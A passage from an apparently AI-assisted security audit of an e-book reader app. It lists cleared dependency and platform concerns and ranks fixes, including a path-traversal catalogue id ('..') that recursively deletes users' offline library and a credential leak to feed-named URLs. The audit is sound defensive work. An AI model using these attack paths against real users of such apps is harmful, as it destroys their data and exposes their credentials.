- **No GitHub advisory affects the rest of the iOS graph.** `gh api /advisories?affects=<pkg>` is empty for readium/GCDWebServer, swisspol/GCDWebServer, stephencelis/SQLite.swift, scinfu/SwiftSoup, krzyzanowskim/CryptoSwift, readium/Fuzi, kishikawakatsumi/SMBClient, readium/swift-toolkit and ra1028/DifferenceKit.
- **ZIPFoundation 3.0.1 (used by Readium for EPUB) carries the CVE-2023-39138 containment fix** — FileManager+ZIP.swift:111 `guard entryURL.isContained(in: destinationURL)` plus Archive+Reading.swift:64-65 `allowUncontainedSymlinks` / `ArchiveError.uncontainedSymlink`. That advisory is cleared for this pin.
- **libarchive CVE-2025-5915 (GHSA-6vpf-5947-22g5, `copy_from_lzss_window` at archive_read_support_format_rar.c:3146) does NOT affect the 3.8.1 pin** — it was patched in 3.8.0. Checked and cleared; do not re-open it. (The nine post-3.8.1 fixes in rank 4 are the live gap.)
- **libarchive rar5 `init_unpack` does NOT carry the upstream #3081 dangling-pointer bug** — archive_read_support_format_rar5.c:2512-2526 already frees, reassigns and NULLs window_buf/filtered_buf with an explicit else branch. One lens claimed otherwise; it was refuted at source.
- **Credentials are stored correctly in the platform secure store.** apps/ios/Packages/StoryArcKit/Sources/Persistence/CredentialStore.swift:49 pins `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`; the Android side uses Keystore-encrypted preferences. The two credential defects found (ranks 7 and 8) are a bypass of this store and a missing delete — not a weakness in the store itself.
- **Certificate pinning for OPDS is real and host-scoped** — apps/ios/Packages/StoryArcKit/Sources/Catalogue/OpdsTrust.swift:30-41,69-126 with `OpdsTrustDelegate` wired into the session at OpdsClient.swift:70,83; Android equivalent at OpdsClient.kt:141-145,235-246. Only the Kavita path bypasses it (rank 15).
- **OPDS responses are never cached to disk** — apps/android/core/catalogue/.../OpdsClient.kt:138 `connection.useCaches = false`, with the reasoning recorded in the code: a catalogue response can name a reader's whole library.
- **Android is not vulnerable to the Int64 header overflows that trap on iOS** — Kotlin wraps silently and the wrapped negative is caught by RandomAccessSource.kt:45 (`if (offset < 0 || count < 0 || offset + count > length)`), so ZipReader.kt:107 and :234 degrade to a thrown exception. Rank 5 is iOS-only.
- **Android enforces the 512 MB per-entry RAR cap that SECURITY.md:35 publishes** — rar_decoder.c:34 `MAX_ENTRY_BYTES`, rejected before allocation at :61-62 and enforced in the loop at :71-73. Rank 12 is iOS-only.
- **jcifs-ng verifies inbound SMB2 signatures** — `jcifs/internal/smb2/Smb2SigningDigest.class` in the resolved 2.1.10 artifact contains a `verify` method. The Android SMB gap (rank 16) is that signing is not *requested*; the missing-verification defect (rank 11) is iOS/SMBClient only.
- **Android DOM storage is off** — scanning every class in readium-navigator-3.3.0 for `setDomStorageEnabled`, `setAcceptThirdPartyCookies` and `CookieManager` returns zero hits, and Android's WebView default for DOM storage is off, so publication JS has no localStorage. iOS additionally isolates each publication under a fresh `readium://<UUID>/` origin (EPUBNavigatorViewModel.swift:76).
- **iOS App Transport Security is correctly scoped** — apps/ios/App/Info.plist:69-73 / project.yml:94-99 set only `NSAllowsLocalNetworking: true`, so cleartext to a public host fails closed. The cleartext problem (rank 10) is Android-only; a cleartext EPUB beacon does not work on iOS.
- **The Android dependency graph is deterministically pinned** — apps/android/gradle/libs.versions.toml uses exact version literals with a comment forbidding version literals in build scripts. The lockfile gap (rank 13) is iOS-only.
- **The `.build/checkouts/swift-toolkit` tree is pristine upstream 3.11.0** — Package.resolved revision d82f44f, and `git log` in the checkout shows only the 3.11.0 tag commit. No vendor code was modified; every Readium-side finding is unconfigured default behaviour, not tampering.
- **Both toolkits are current** — readium kotlin-toolkit 3.3.0 (released 2026-06-02) and readium/swift-toolkit 3.11.0 are each the newest stable. The 3.3.0-vs-3.11.0 gap in the inventory is independent versioning, not skew; do not file it as an out-of-date dependency.

---

## What I would do first

Fix rank 1 today. It is a one-line change in each `safe()`, and it is the only finding in this list that destroys the reader's data: a hostile catalogue entry with `<id>` of `..` plus a failed download recursively deletes every offline publication (and, on iOS, the SwiftData store holding all reading progress, bookmarks and annotations). Two lenses found it independently and one verifier reproduced the delete against a sandbox tree. `CoverCache.file(for:)` already hashes the id one directory away with a comment explaining exactly why — copy that. Add the `remove()` containment check at the same time so a future sanitiser gap cannot become a recursive delete again.

Then rank 2 (credential attached to any feed-named URL) — also small, also a real exfiltration, and the cover path fires unattended as the browse grid scrolls. Ranks 1, 2, 5, 6 and 9 together are maybe two days and they cover the whole "hostile server or crafted file, no interaction beyond opening/scrolling" band. Rank 4 (re-vendor libarchive to 3.8.9) is mechanical and the procedure is already written in your own VENDORING.md; the reason it is ranked fourth rather than lower is that it sits on the C parser every CBR reaches, and no scanner will ever tell you when it goes stale — the CI version-watch matters as much as the refresh.

Rank 3 is the one that needs a decision rather than a patch. Blocking remote subresources in the EPUB WebView is the only finding here that contradicts a headline promise (README.md:390, AGENTS.md non-negotiable 2) with literally zero interaction, but the clean fix may require a Readium hook you do not have, and turning scripting off changes what publications render. Decide deliberately: deny-by-default plus an opt-in Privacy setting, or amend SECURITY.md:37 to admit network egress is not in scope. Rank 11 (iOS SMB never verifies response signatures) is the other decision — the defect is in SMBClient, not your code, so it is either an upstream fix, a client swap, or an honest line on the source detail screen.

**Could not be settled without a device or a build** (four agents were building concurrently, so Gradle/swift build/swift test were off-limits this run):
- Rank 17 (BouncyCastle 1.76 / CVE-2025-8885): the supply chain and reachability are proven from the POM and the jar's constant pool, but whether 1.76's `ASN1ObjectIdentifier` actually over-allocates on the token shapes jcifs hands it needs the dependency's source or a runtime test. Just pin to 1.84 — it is cheaper than resolving the question.
- Rank 6 on Android: jcifs-ng is not vendored here, so whether `SmbFile.getName()` passes a slash-bearing name through is unproven. The iOS half is proven end to end; fix both regardless, the sanitisation belongs at the call site.
- Rank 19: whether either WebView accepts a third-party cookie in the `readium_package` context is platform behaviour, not readable from this checkout. Needs a device.
- Rank 14 on Android: whether a JS-driven `window.location` can reach `onExternalLinkActivated` without a tap needs `shouldOverrideUrlLoading` decompiled (no JVM available here). If it can, this rises above low.
- Rank 5: the trap is proven by reading (no `-Ounchecked` in Package.swift:112-116), but a crafted-CBZ fixture through the real scanner would confirm the crash-on-every-launch behaviour, and that fixture belongs in the test suite anyway.

Two things worth noticing as a pattern rather than as findings: several defects are places where a doc comment or a published document asserts a control that the code does not implement (`safe()`'s "nothing that reads as a path", `Source.swift:55-57`'s "never the secret itself", SECURITY.md:35's 512 MB cap, the Kavita `pins` parameter, the "web-view data" string). Each of those will make the next reader stop looking. And the two platforms drift in both directions — Android is safe where iOS traps (rank 5), iOS is safe where Android crashes (rank 9) — so a fix on one side is worth checking against the other every time.
